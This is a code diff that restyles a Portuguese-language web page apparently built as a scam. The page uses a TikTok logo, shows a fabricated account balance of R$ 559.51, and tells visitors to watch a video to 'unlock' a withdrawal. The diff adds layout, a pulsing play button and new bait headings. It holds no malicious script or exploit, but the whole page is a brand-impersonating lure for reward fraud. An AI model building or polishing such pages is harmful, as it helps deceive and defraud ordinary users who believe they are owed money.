@@ -12,10 +12,16 @@
             min-height: 100vh;
             margin: 0;
             background-color: #f0f0f0;
-            font-family: 'Roboto', sans-serif;
+            font-family: sans-serif;
+            align-items: center;
+            justify-content: flex-start;
+            padding-top: 10px; /* Compensa o header fixo */
         }
 
         .header {
+            position: fixed;
+            top: 0;
+            left: 0;
             width: 100%;
             background-color: #ff0150;
             color: white;
@@ -23,12 +29,12 @@
             text-align: center;
             padding: 10px;
             font-size: 12px;
+            z-index: 1000;
         }
 
         #p1 {
             max-width: 400px;
-            width: 100%;
-
+            width: 90%;
             background-color: #FFFFFF;
             padding: 15px;
             border-bottom: 1px solid #202020;
@@ -36,23 +42,34 @@
             align-items: center;
             justify-content: space-between;
             margin: 20px auto;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
         }
+        #produto1 {
+        width: 100%;
+        max-width: 400px;
+        text-align: center;
+        padding: 0px;
+        color: #ff0150;
+        font-size: 16px;
+
+    }
 
         #logo {
-            width: 130px;
+            width: 100px;
+            max-width: 130px;
         }
 
         .boxSaldo {
             display: flex;
             flex-direction: column;
             align-items: flex-end;
-            border: 2px solid #ff0150;
+            border: 3px solid #ff0150;
             border-radius: 6px;
             padding: 5px 10px;
         }
 
         .textoSaldo {
-            font-size: 10px;
+            font-size: 12px;
             font-weight: bold;
             background: #fff;
             padding: 2px 14px;
@@ -60,15 +77,14 @@
         }
 
         .valorSaldo {
-            font-size: 14px;
+            font-size: 164x;
             font-weight: 700;
             color: #333;
         }
 
         .phone-container {
-            width: 80%;
-            max-width: 340px;
-            padding-top: 136.78%;
+            width: 340px;
+            height: 620px; /* Aspect ratio similar a 9:16 */
             border: 4px solid #9A03D7;
             border-radius: 36px;
             box-shadow: 0 0 20px rgba(172, 26, 153, 0.432);
@@ -106,23 +122,56 @@
             cursor: pointer;
             background: url('images/65248.webp') center center no-repeat;
             background-size: cover;
-            transform: translateX(-50%);
+            transform: translateX(-50%) scale(2);
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% {
+                transform: translateX(-50%) scale(0.85);
+                box-shadow: 0 0 0 0 #9A03D7;
+            }
+            50% {
+                transform: translateX(-50%) scale(1);
+                box-shadow: 0 0 0 10px rgba(0, 0, 0, 0);
+            }
+            100% {
+                transform: translateX(-50%) scale(0.95);
+                box-shadow: 0 0 0 0 rgba(0, 0, 0, 0);
+            }
+        }
+
+        @keyframes fadeInUp {
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+
+        .video-thumbnail.hidden {
+            opacity: 0;
+            visibility: hidden;
         }
     </style>
 </head>
 <body>
     <div class="header">
-        ASSISTA O VÍDEO ABAIXO PARA LIBERAR SEU SAQUE E ACESSO VITALÍCIO.
+        ASSISTA O VÍDEO ABAIXO PARA LIBERAR SEU SAQUE E ACESSO.
     </div>
     
     <div id="p1">
+        
         <img id="logo" src="images/tiktoklogo.svg" alt="TikTok Logo">
         <div class="boxSaldo">
             <span class="textoSaldo">SALDO</span>
             <span class="valorSaldo">R$ <span class="saldoAtualizado">559.51</span></span>
         </div>
     </div>
-    
+    <div id="produto1">
+        <h4 style="font-size: 22px; margin-top: 2px;">DESBLOQUEIO DE SALDO</h4>
+        <h1 style="color: #000000be; font-size: 15px; margin-bottom: 4%;">Veja como liberar seu saque assistindo ao vídeo.</h1> 
+    </div>   
     <div class="phone-container">
         <div class="video-container" onclick="unmuteVideo()">
             <video id="myVideo" autoplay muted>
@@ -140,7 +189,7 @@
                 video.muted = false;
                 video.currentTime = 0;
                 video.play();
-                thumbnail.style.display = 'none';
+                thumbnail.classList.add('hidden'); // Oculta a thumbnail com animação
             }
         }
     </script>
